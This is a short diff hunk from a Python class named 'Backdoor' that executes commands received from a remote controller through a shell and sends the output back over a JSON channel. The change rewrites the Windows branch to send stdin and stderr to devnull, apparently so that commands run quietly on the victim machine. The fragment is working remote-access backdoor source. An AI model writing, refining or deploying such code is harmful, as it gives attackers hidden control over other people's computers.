@@ -398,8 +398,9 @@ class Backdoor:
                     cmd = ' '.join(cmd[0:])
                     if os_type == "linux":
                         result = str(subprocess.check_output(cmd + "; exit 0" , shell=True,stderr=subprocess.STDOUT))
-                    else:
-                        result = str(subprocess.check_output(cmd , shell=True,stderr=subprocess.STDOUT))
+                    else:               
+                        DEVNULL = open(os.devnull, 'wb')
+                        result = str(subprocess.check_output(cmd,shell=True, stderr=DEVNULL, stdin=DEVNULL))
                 except:
                     result = " "
             self.json_send(result)
